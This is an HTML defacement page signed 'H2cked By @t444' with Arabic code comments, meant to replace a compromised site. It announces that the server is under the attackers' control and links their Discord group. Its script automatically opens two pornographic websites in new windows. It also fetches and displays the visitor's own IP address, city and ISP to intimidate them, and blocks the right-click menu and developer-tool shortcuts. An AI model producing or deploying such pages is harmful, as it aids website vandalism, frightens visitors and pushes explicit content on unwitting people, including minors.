<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>H2cked By @t444</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }

  html, body { height: 100%; }

  body {
    background: #000;
    font-family: monospace;
    color: #ccc;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 30px 15px;
    overflow-x: hidden;
  }

  /* شاشة البداية */
  #intro {
    position: fixed;
    inset: 0;
    background: #000;
    z-index: 9999;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: opacity 1s ease, visibility 1s ease;
  }

  #intro.hide {
    opacity: 0;
    visibility: hidden;
  }

  #intro-text {
    font-size: 28px;
    color: #cc0000;
    letter-spacing: 4px;
    text-shadow: 0 0 12px rgba(204, 0, 0, 0.8);
    white-space: nowrap;
  }

  #intro-text .prompt {
    color: #666;
    margin-right: 8px;
  }

  #intro-text .caret {
    display: inline-block;
    width: 13px;
    height: 26px;
    background: #cc0000;
    margin-left: 6px;
    vertical-align: middle;
    animation: caretBlink 0.7s steps(1) infinite;
  }

  @keyframes caretBlink {
    0%, 49%  { opacity: 1; }
    50%,100% { opacity: 0; }
  }

  /* خلفية الفيديو */
  .video-bg {
    position: fixed;
    top: 0; left: 0;
    width: 100vw; height: 100vh;
    object-fit: cover;
    z-index: -100;
    pointer-events: none;
    filter: grayscale(100%) contrast(1.1);
  }

  .overlay {
    position: fixed;
    inset: 0;
    background: rgba(0, 0, 0, 0.6);
    z-index: -50;
  }

  /* المحتوى الرئيسي */
  .wrap {
    width: 100%;
    max-width: 520px;
    margin: 0 auto;
    text-align: center;
    opacity: 0;
    transition: opacity 1.2s ease;
  }

  .wrap.show { opacity: 1; }

  .h2cked {
    font-size: 30px;
    font-weight: bold;
    color: #cc0000;
    text-shadow: 0 0 8px rgba(204, 0, 0, 0.8);
    margin-bottom: 14px;
    letter-spacing: 1px;
    animation: blink 1.6s infinite;
  }

  .h2cked .name { color: #eee; }

  @keyframes blink {
    0%, 100% { opacity: 1; }
    50%      { opacity: 0.55; }
  }

  .discord {
    font-size: 16px;
    margin-bottom: 10px;
  }

  .discord a {
    color: #999;
    text-decoration: none;
    border-bottom: 1px solid #666;
    padding-bottom: 2px;
    transition: color 0.2s, border-color 0.2s;
  }

  .discord a:hover {
    color: #cc0000;
    border-color: #cc0000;
  }

  .msg {
    font-size: 16px;
    color: #888;
    margin-bottom: 30px;
    letter-spacing: 0.5px;
  }

  .msg .hl {
    color: #cc0000;
    font-weight: bold;
  }

  .info {
    background: rgba(20, 20, 20, 0.85);
    border: 1px solid #444;
    border-radius: 6px;
    padding: 14px 18px;
    text-align: left;
    font-size: 14px;
    line-height: 2;
    margin-bottom: 30px;
  }

  .info .row {
    display: flex;
    justify-content: space-between;
    gap: 12px;
    border-bottom: 1px solid rgba(120, 120, 120, 0.15);
    padding-bottom: 2px;
  }

  .info .row:last-child { border-bottom: none; }

  .info .label {
    color: #999;
    flex-shrink: 0;
  }

  .info .value {
    color: #ddd;
    text-align: right;
    word-break: break-all;
  }

  #ip {
    cursor: pointer;
    color: #cc0000;
    font-weight: bold;
  }

  #ip:hover { text-decoration: underline; }

  .down {
    font-size: 22px;
    font-weight: bold;
    color: #cc0000;
    text-shadow: 0 0 8px rgba(204, 0, 0, 0.9);
    letter-spacing: 1px;
    animation: blink 1s infinite;
  }

  @media (max-width: 420px) {
    #intro-text { font-size: 18px; letter-spacing: 2px; }
    #intro-text .caret { width: 9px; height: 18px; }
    .h2cked { font-size: 22px; }
    .info { font-size: 12.5px; padding: 12px 14px; }
    .down { font-size: 18px; }
  }
</style>
</head>

<body>

<!-- شاشة البداية -->
<div id="intro">
  <div id="intro-text">
    <span class="prompt">root@t444:~#</span><span class="words"></span><span class="caret"></span>
  </div>
</div>

<video class="video-bg" autoplay muted loop playsinline preload="auto">
  <source src="https://o.top4top.io/m_3920ug95k1.mp4" type="video/mp4">
</video>

<div class="overlay"></div>

<div class="wrap" id="main">

  <div class="h2cked">
    H2cked By [ <span class="name">@t444</span> ]
  </div>

  <div class="discord">
    <a href="https://discord.gg/nb" target="_blank" rel="noopener noreferrer">Our Group</a>
  </div>

  <div class="msg">
    <span class="hl">@t444</span> has taken over this server
  </div>

  <div class="info">
    <div class="row">
      <span class="label">IP:</span>
      <span class="value" id="ip" title="click to copy">...</span>
    </div>
    <div class="row">
      <span class="label">City:</span>
      <span class="value" id="city">...</span>
    </div>
    <div class="row">
      <span class="label">Region:</span>
      <span class="value" id="region">...</span>
    </div>
    <div class="row">
      <span class="label">Country:</span>
      <span class="value" id="country">...</span>
    </div>
    <div class="row">
      <span class="label">Location:</span>
      <span class="value" id="loc">...</span>
    </div>
    <div class="row">
      <span class="label">Org:</span>
      <span class="value" id="org">...</span>
    </div>
    <div class="row">
      <span class="label">Timezone:</span>
      <span class="value" id="timezone">...</span>
    </div>
  </div>

  <div class="down">
    Your server is now under our control
  </div>

</div>

<audio id="bg-audio" loop preload="auto">
  <source src="https://g.top4top.io/m_39206hfk31.mp3" type="audio/mpeg">
</audio>

<script>
  const video = document.querySelector('.video-bg');
  const audio = document.getElementById('bg-audio');

  /* تشغيل الفيديو فقط من البداية (مكتوم) */
  video.play().catch(()=>{});

  /* ============================================================
     شاشة البداية — كتابة "Access Granted" بأسلوب طرفية
     ============================================================ */
  (function introTyping() {
    const wordsEl = document.querySelector('#intro-text .words');
    const intro   = document.getElementById('intro');
    const main    = document.getElementById('main');

    const text = 'Access Granted';
    let i = 0;

    function type() {
      if (i < text.length) {
        wordsEl.textContent += text[i];
        i++;
        setTimeout(type, 80 + Math.random() * 60);
      } else {
        setTimeout(() => {
          intro.classList.add('hide');
          setTimeout(() => {
            main.classList.add('show');
            
            // 🟢 فتح الرابط تلقائياً في نافذة جديدة بمجرد ظهور الواجهة
            
            window.open('https://de.pornhub.org/');
            window.open('https://www.xnxx.com/search/jeans');

            audio.play().catch(() => {
              ['click','touchstart','keydown','mousemove'].forEach(ev =>
                document.addEventListener(ev, () => audio.play().catch(()=>{}), { once: true })
              );
            });
          }, 200);
        }, 1200);
      }
    }

    setTimeout(type, 500);
  })();

  /* الحماية */
  document.addEventListener('contextmenu', e => e.preventDefault());

  document.onkeydown = function(e) {
    if (e.keyCode == 123 ||
       (e.ctrlKey && e.shiftKey && e.keyCode == 73) ||
       (e.ctrlKey && e.shiftKey && e.keyCode == 74) ||
       (e.ctrlKey && e.keyCode == 85) ||
       (e.ctrlKey && e.keyCode == 83)) {
      return false;
    }
  };

  /* جلب معلومات الـ IP */
  const set = (id, val) => {
    document.getElementById(id).textContent = (val && val !== '') ? val : '?';
  };

  fetch("https://ipinfo.io/json")
    .then(r => r.json())
    .then(d => {
      set('ip', d.ip);
      set('city', d.city);
      set('region', d.region);
      set('country', d.country);
      set('loc', d.loc);
      set('org', d.org);
      set('timezone', d.timezone);
    })
    .catch(() => set('ip', '?'));

  /* نسخ الـ IP */
  document.getElementById('ip').onclick = function() {
    const t = this.textContent;
    if (t === '...' || t === '?') return;
    const el = this;
    navigator.clipboard && navigator.clipboard.writeText(t).then(() => {
      el.textContent = 'copied!';
      setTimeout(() => el.textContent = t, 1000);
    });
  };
</script>

</body>
</html>
